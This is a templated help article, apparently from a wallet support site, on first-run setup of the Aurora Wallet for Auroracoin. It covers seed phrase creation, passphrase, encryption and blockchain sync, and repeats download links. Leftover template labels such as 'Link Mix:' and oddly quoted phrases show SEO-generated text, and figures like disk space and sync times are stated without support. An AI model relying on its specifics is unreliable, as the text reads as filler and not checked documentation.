---
title: "First Run Setup: Configuring Your Aurora Wallet"
description: "Follow this step-by-step guide to set up your Aurora Wallet for the first time. Learn about seed phrase generation, encryption, and initial blockchain syncing."
primary_keyword: "aurora wallet setup guide"
silo: "Getting Started"
updated: 2026-10-10
---

![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)

[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)

# First Run Setup: Configuring Your Aurora Wallet

Setting up your Aurora Wallet for the first time is a critical process that establishes the foundation for your Auroracoin (AUR) security. The initial configuration involves generating a unique BIP-39 recovery phrase, selecting a secure data directory, and allowing the software to synchronize with the global Auroracoin blockchain to ensure your transaction history and balances are accurately reflected in a self-custodial environment.

## You'll see this if

*   You have just downloaded and installed the Aurora Wallet and are launching it for the very first time.
*   You are migrating to a new computer and need to initialize a fresh installation of the wallet software.
*   You have cleared your local data directory and the application is prompting you for a new setup wizard.
*   You are switching from a legacy wallet version and need to set up a modern BIP-39 compliant interface.
*   You want to restore an existing wallet using a 12 or 24-word seed phrase on a clean machine.

## Why the Initial Setup is Critical

The first time you run Aurora Wallet, you are not just opening a program; you are generating the cryptographic keys that will secure your wealth. Unlike traditional banking, there is no "Forgot Password" link for your blockchain assets. The setup phase is "designed to" provide you with all the tools necessary to maintain complete control over your Auroracoin (AUR), but it requires careful attention to security best practices.

During this phase, the wallet software creates a locally stored database that will eventually house your transaction history and encrypted private keys. Because Aurora Wallet is a decentralized tool, the Auroracoin Foundation never sees your keys, your password, or your recovery phrase. This means the responsibility for backing up this information lies solely with you. A proper setup ensures that even if your hardware fails, you can recover your funds on any other device.

---

## The fix: Step-by-Step Configuration

Follow these steps carefully to ensure your Aurora Wallet is configured correctly and securely.

### 1. Preparing Your Environment
Before you even click the icon to launch the app, ensure your environment is secure.
*   **Physical Privacy:** Make sure no one is looking over your shoulder and that there are no cameras (including webcams) pointed at your screen.
*   **Device Health:** Ensure your operating system is updated and free of malware.
*   **Recording Materials:** Have a pen and paper (or a dedicated seed storage device) ready. Never use a digital notepad or take a photo of your recovery phrase.

### 2. Selecting a Data Directory
Upon launch, Aurora Wallet will ask where you want to store the blockchain data.
*   **Default Location:** Most users should choose the default path.
*   **Custom Location:** If your primary drive is low on space, you can select an external drive or a different partition. Ensure the drive is fast (SSD is highly recommended) and has at least 10 GB of free space.
*   **Link Mix:** You can find more details on where these files are kept in the [wallet.dat location guide](21-wallet-dat-location.md).

### 3. Generating or Restoring a Wallet
You will be presented with two main options: "Create a new wallet" or "Restore from seed."
*   **For New Users:** Select "Create a new wallet." The software will use a high-entropy random number generator to create your unique keys.
*   **For Existing Users:** If you already have a 12 or 24-word phrase, select "Restore" and enter your words in the correct order.

### 4. Securing Your BIP-39 Recovery Phrase
The wallet will display a sequence of words. This is the most important part of the setup.
*   **Write it Down:** Record every word in the exact order shown.
*   **Verify:** The software will likely ask you to confirm several words to ensure you have recorded them correctly.
*   **Storage:** Store this paper in a fireproof and waterproof location. 
*   > [!WARNING]
    > Never share your recovery phrase with anyone. No legitimate support agent, developer, or website will ever ask for these words. If they do, it is a phishing attempt.

### 5. Setting an Optional Passphrase
You may be offered the choice to add a "Passphrase" (sometimes called a 13th or 25th word).
*   **Advanced Security:** This acts as a secondary layer of protection. Without both the seed phrase and this passphrase, the funds cannot be accessed.
*   **Risk:** If you forget this passphrase, your funds are lost forever, even if you have the 24 words. Only use this if you are confident in your [password encryption](34-password-encryption.md) management.

### 6. Wallet Encryption
Once the wallet interface opens, you should immediately set an application password.
*   **Purpose:** This password encrypts your local files and is required every time you send a transaction.
*   **Complexity:** Use a long, unique password that you do not use for any other service.

---

## The Synchronization Process

After the configuration is complete, the Aurora Wallet will begin "Synchronizing with network."

*   **What is Syncing?** The wallet is downloading the history of every Auroracoin transaction ever made. This allows the wallet to calculate your current balance correctly.
*   **How long does it take?** Depending on your internet speed and the speed of your disk (HDD vs SSD), this can take between 4 and 24 hours.
*   **Progress Bar:** You can monitor the progress at the bottom of the wallet window. Do not attempt to send or receive funds until the synchronization is 100% complete.
*   **Connectivity:** If the sync is not progressing, visit the [Wallet Not Syncing guide](https://auroracoin.net/troubleshooting/wallet-not-syncing) on the official website for troubleshooting steps.

## If that didn't work

*   **Insufficient Disk Space:** If the wallet stops syncing and throws an error, verify that your selected data directory has not run out of storage space.
*   **Firewall Blocks:** If the "active connections" count remains at zero, you may need to manually allow the Aurora Wallet through your OS firewall. Refer to the [Windows Defender](18-windows-defender-smartscreen.md) or [Linux permissions](20-linux-permissions.md) guides for help.
*   **Corrupt Installation:** If the app crashes immediately upon setup, delete the temporary files in the data directory and restart the process.

## Prevention

*   **Test Your Backup:** Before sending large amounts of AUR to your new wallet, consider deleting the app and restoring it using your seed phrase to ensure you recorded it correctly.
*   **Regular Backups:** Even with a seed phrase, keeping a backup of your `wallet.dat` file after adding labels or new addresses is a good habit. See our [backup best practice](33-backup-best-practice.md) article.
*   **Official Downloads:** Always ensure you are running the genuine software by checking the [GitHub releases guide](07-github-releases-guide.md).
*   **Security awareness:** For more information on self-custody and protecting your assets, visit the [official Security page](https://auroracoin.net/security).

---

## FAQ

**Do I need an internet connection for the whole setup?**
You need an internet connection to download the blockchain (syncing) and to broadcast transactions, but the generation of your seed phrase happens offline on your local machine.

**What happens if I lose my recovery phrase?**
If you lose your 12 or 24-word recovery phrase and lose access to your computer, your Auroracoin (AUR) is lost forever. There is no way for the Auroracoin Foundation to recover it for you.

**Can I skip the encryption password?**
Technically yes, but it is highly discouraged. Encryption is "designed to" protect your funds if your computer is stolen or accessed by an unauthorized user.

**Why is the blockchain download so slow?**
The speed is limited by your internet bandwidth and your computer's ability to verify each block's cryptographic signature. Using an SSD significantly speeds up this process.

---

## The current release

Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:

[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)

Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)

## Related articles

*   [01-what-is-aurora-wallet.md](01-what-is-aurora-wallet.md)
*   [33-backup-best-practice.md](33-backup-best-practice.md)
*   [25-recovery-phrase-bip39.md](25-recovery-phrase-bip39.md)
*   [34-password-encryption.md](34-password-encryption.md)
